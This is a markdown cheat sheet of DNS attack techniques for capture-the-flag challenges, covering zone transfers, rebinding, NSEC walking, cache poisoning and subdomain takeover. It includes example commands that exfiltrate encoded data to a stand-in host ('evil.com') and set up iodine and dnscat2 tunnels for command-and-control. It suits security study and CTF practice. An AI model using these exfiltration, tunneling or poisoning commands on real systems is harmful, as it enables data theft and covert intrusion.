# DNS Protocol Challenges

## DNS Fundamentals

```bash
dig <domain>                            # A record
dig <domain> ANY                        # all records
dig <domain> TXT                        # TXT records
dig <domain> MX                         # mail servers
dig <domain> NS                         # name servers
dig <domain> AXFR @<ns>                 # zone transfer (if allowed)
dig +short <domain>                     # concise output
dig @<specific-ns> <domain>             # query specific server
nslookup <domain>                       # alternative tool
host <domain>                           # simple lookup
```

## Zone Transfer (AXFR)

**When**: DNS server allows zone transfers to unauthorized clients.

```bash
dig AXFR <domain> @<nameserver>
# Returns ALL DNS records for the zone
# Look for: internal hostnames, hidden subdomains, TXT records with flags
```

## DNS Rebinding

**When**: Need to bypass same-origin policy or access internal
services from a browser.

**How**: Set up a domain with a very short TTL that alternates
between the attacker's IP and the target's internal IP.

```
1. Victim loads attacker.com (resolves to attacker's IP)
2. JavaScript on the page waits for DNS cache to expire
3. Next request to attacker.com resolves to 127.0.0.1 (or internal IP)
4. Browser sends request to internal service with attacker.com cookies
```

**Tools**: `rbndr.us`, `rebinder`, custom DNS server with programmatic responses.

## DNSSEC

### NSEC Walking

**When**: DNSSEC uses NSEC (not NSEC3) to prove non-existence of records.

**How**: NSEC records link to the "next" existing name in the zone.
Walk the chain to enumerate all domain names.

```bash
# Start with a query for a non-existent name
dig nonexistent.<domain> @<ns>
# The NSEC record in the response reveals the next existing name
# Repeat with names between known records

# Automated: ldns-walk, nsec3walker
ldns-walk <domain>
```

### NSEC3 Cracking

NSEC3 hashes domain names before including them in NSEC3 records.
With a weak salt or known algorithm, brute-force the hashes:

```bash
# Extract NSEC3 parameters
dig <domain> NSEC3PARAM

# Crack NSEC3 hashes
nsec3walker --zone <domain> --dictionary wordlist.txt
hashcat -m 8300 nsec3_hashes.txt wordlist.txt
```

## DNS Exfiltration

### Subdomain Encoding

```bash
# Data encoded as subdomain labels
# base64encoded.evil.com → DNS query captured by attacker's NS
echo "flag{secret}" | base64 | tr -d '\n' | xargs -I{} dig {}.evil.com

# Receiving end: capture queries on authoritative NS
tcpdump -i eth0 port 53 -l | grep evil.com
```

### TXT Record Exfiltration

```bash
# Store data in TXT records
# Attacker queries TXT records of a controlled domain
dig TXT data.evil.com
# The authoritative NS can return data dynamically
```

## DNS Tunneling

Tools: `iodine`, `dnscat2`, `dns2tcp`

```bash
# iodine — IP-over-DNS tunnel
iodined -c -f 10.0.0.1 tunnel.evil.com        # server
iodine -f tunnel.evil.com                       # client
# Creates a virtual network interface tunneling over DNS

# dnscat2 — C2 over DNS
dnscat2-server tunnel.evil.com                  # server
dnscat2 tunnel.evil.com                         # client
```

## DNS Spoofing / Cache Poisoning

### Kaminsky Attack

Race to inject a forged DNS response before the legitimate
response arrives. The forged response includes a glue record
pointing the NS to the attacker's server.

```python
# Simplified: send many forged responses with guessed TXID
import socket
for txid in range(65536):
    pkt = forge_dns_response(txid, domain, attacker_ip)
    sock.sendto(pkt, (resolver_ip, 53))
```

### Source Port Randomization Bypass

Modern resolvers randomize source ports (not just TXID).
Birthday attack: send queries for random subdomains and
matching forged responses — probability of collision increases.

## DNS Record Types

| Type | Use in CTF |
|---|---|
| A | IP address — target for web challenges |
| AAAA | IPv6 address — may hide alternate services |
| CNAME | Alias — subdomain takeover if dangling |
| TXT | Arbitrary text — often contains flags or clues |
| MX | Mail server — may reveal internal infrastructure |
| NS | Nameserver — zone transfer target |
| SRV | Service discovery — reveals internal services |
| PTR | Reverse DNS — IP to hostname mapping |
| SOA | Zone authority — contains admin email |
| CAA | Certificate authority — reveals PKI setup |

## ECS (EDNS Client Subnet) Spoofing

**When**: DNS resolver supports ECS and returns different
results based on client subnet.

```bash
# Query with spoofed client subnet
dig +subnet=10.0.0.0/24 <domain> @<resolver>
# May return internal/different IP addresses
```

## Subdomain Takeover

**When**: A CNAME record points to a service that has been
decommissioned (dangling CNAME).

```bash
# Check for dangling CNAMEs
dig CNAME sub.target.com
# If it points to a cloud service (AWS, Azure, GitHub Pages)
# that no longer exists: claim the service → control the subdomain
```

**Indicators**: NXDOMAIN on the CNAME target, cloud provider
error pages ("There isn't a GitHub Pages site here").
